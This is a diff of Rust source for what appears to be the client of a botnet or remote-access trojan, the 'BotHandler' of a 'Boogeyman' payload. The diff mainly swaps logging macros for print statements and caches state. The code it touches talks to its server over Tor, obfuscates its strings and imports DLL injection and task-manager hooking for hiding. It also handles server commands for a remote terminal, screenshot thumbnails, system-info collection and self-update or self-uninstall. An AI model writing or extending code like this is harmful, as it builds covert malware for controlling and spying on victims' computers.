@@ -19,8 +19,6 @@ use shared::{
 use obfstr::obfstr as s;
 use tokio::sync::{ Mutex, RwLock };
 use crate::{
-    err,
-    info,
     tasks::task_manager_hook::{ inject_dll, update_query_hooker_list },
     utils::{
         system_info::{ generate_bot_state, get_dynamic_info, get_thumbnail },
@@ -45,11 +43,10 @@ impl BotHandler {
     pub async fn new(logger_config: LoggerCnfg) -> Result<Self> {
         let tor_handler = TrHandler::new(logger_config).await?;
         let bot_state = generate_bot_state().await;
-        info!("bot state gened, pc name: ", bot_state.os_info.host_name);
         let terminal = match Terminal::new() {
             Ok(terminal) => { Some(Arc::new(Mutex::new(terminal))) }
             Err(error) => {
-                err!("error getting terminal: ", error);
+                eprintln!("error getting terminal: {}", error);
                 None
             }
         };
@@ -77,32 +74,27 @@ impl BotHandler {
                     &raw_data
                 )
             {
-                if let Err(_error) = Self::process_data(decrypted_data, self_ref).await {
+                if let Err(error) = Self::process_data(decrypted_data, self_ref).await {
                     //? HONESTLY THIS ERROR VERY IMPORTANT WE SHOULD REPORT IT TO SERVER VIA DEFAULT ERROR type
-                    // ref_err!(
-                    //     self_clone.logger.lock().unwrap(),
-                    //     "Failed to process data via callback: ",
-                    //     error
-                    // );
+                    eprintln!("Failed to process data via callback: {}", error);
                 };
             }
         });
     }
     fn connect_callback_init(self_ref: RwPtr<Self>) {
+        println!("connect callback");
         tokio::task::spawn(async move {
-            info!("connect_callback_init");
-
             let self_guard = self_ref.read().await;
             let params = InitParams { bot_state: self_guard.bot_state.read().await.clone() };
             drop(self_guard);
             if
-                let Err(_error) = Self::send_data(
+                let Err(error) = Self::send_data(
                     self_ref.clone(),
                     ServerAction::Init,
                     ServerParams::Init(params)
                 ).await
             {
-                // err
+                eprintln!("Failed to send data: {}", error);
             }
         });
     }
@@ -119,7 +111,7 @@ impl BotHandler {
         processed_data: BoogeymanReceivePayload,
         self_ref: RwPtr<Self>
     ) -> Result<()> {
-        // println!("{:#?}", processed_data);
+        println!("routing data: {:#?}", processed_data);
         match processed_data.action {
             receive::ClientAction::UninstallSelf => {}
             receive::ClientAction::UpdateSelf => {}
@@ -140,6 +132,7 @@ impl BotHandler {
                                     error: Some(format!("{:#?}", error)),
                                 },
                         };
+
                         drop(terminal);
                         Self::send_data(
                             self_ref.clone(),
@@ -191,7 +184,18 @@ impl BotHandler {
             }
             receive::ClientAction::FetchDynamicData => {
                 if let ClientParams::FetchDynamicData(_params) = processed_data.params {
-                    let data = send::UpdateDynamicDataParams { dynamic_info: get_dynamic_info() };
+                    let dynamic_info = get_dynamic_info();
+                    let clone = self_ref.clone();
+                    let lock = clone.read().await;
+                    let mut bot_state: tokio::sync::RwLockWriteGuard<
+                        '_,
+                        BotState
+                    > = lock.bot_state.write().await;
+                    bot_state.dynamic_info = dynamic_info.clone();
+                    drop(bot_state);
+                    drop(lock);
+
+                    let data = send::UpdateDynamicDataParams { dynamic_info };
 
                     Self::send_data(
                         self_ref,
@@ -208,7 +212,17 @@ impl BotHandler {
             }
             receive::ClientAction::FetchThumbnail => {
                 if let ClientParams::FetchThumbnail(_params) = processed_data.params {
-                    let data = send::UpdateThumbnailParams { thumbnail: get_thumbnail()? };
+                    let thumbnail = get_thumbnail().map(Some).unwrap_or(None);
+                    let clone = self_ref.clone();
+                    let lock = clone.read().await;
+                    let mut bot_state: tokio::sync::RwLockWriteGuard<
+                        '_,
+                        BotState
+                    > = lock.bot_state.write().await;
+                    bot_state.thumbnail = thumbnail.clone();
+                    drop(bot_state);
+                    drop(lock);
+                    let data = send::UpdateThumbnailParams { thumbnail };
 
                     Self::send_data(
                         self_ref,
@@ -356,7 +370,7 @@ impl BotHandler {
         action: ServerAction,
         params: ServerParams
     ) -> Result<()> {
-        info!("SENDING DATA");
+        // println!("SENDING DATA: {:#?}, {:#?}", action, params);
         let tor_h = &self_ref.read().await.tr_handler;
 
         let payload = BoogeymanSendPayload {
